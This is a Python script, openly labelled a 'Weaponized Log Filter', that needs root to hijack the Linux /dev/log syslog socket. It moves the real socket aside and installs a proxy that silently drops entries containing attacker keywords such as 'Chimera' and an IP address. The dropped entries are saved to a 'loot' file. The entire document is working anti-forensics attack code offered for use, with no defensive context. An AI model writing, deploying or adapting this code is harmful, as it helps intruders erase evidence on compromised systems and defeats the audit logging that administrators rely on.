import os
import sys
import socket
import threading

def shadow_log_filter(socket_path="/dev/log", target_keywords=["Chimera", "181", "10.255.255.1"]):
    """
    Weaponized Log Filter: Intercepts the system log socket to 
    silently drop sensitive log entries before they hit the disk.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: Socket hijacking requires UID 0.")
        sys.exit(1)

    real_log_socket = "/dev/log_real"
    
    print(f"[*] Diverting {socket_path} to {real_log_socket}...")

    try:
        # 1. Move the real socket to a hidden location
        if os.path.exists(socket_path):
            os.rename(socket_path, real_log_socket)

        # 2. Create our "Fake" /dev/log to intercept traffic
        proxy_sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        proxy_sock.bind(socket_path)
        os.chmod(socket_path, 0o666) # Ensure apps can write to it

        # 3. Open connection to the real syslog daemon
        backend_sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)

        print("[!!!] SUCCESS: Shadow Log Filter is LIVE. Keywords blocked: ", target_keywords)

        while True:
            data, addr = proxy_sock.recvfrom(4096)
            msg = data.decode(errors='ignore')
            
            # Filtering Logic: Only forward if keywords aren't present
            if not any(key in msg for key in target_keywords):
                try:
                    backend_sock.sendto(data, real_log_socket)
                except:
                    pass
            else:
                # Log the blocked entry to the Chimera loot for your eyes only
                with open("../../../loot/blocked_logs.log", "a") as f:
                    f.write(f"[BLOCKED] {msg}\n")

    except Exception as e:
        print(f"[-] Filter Fault: {e}")
        # Emergency Restore
        if os.path.exists(real_log_socket):
            os.rename(real_log_socket, socket_path)

if __name__ == "__main__":
    shadow_log_filter()
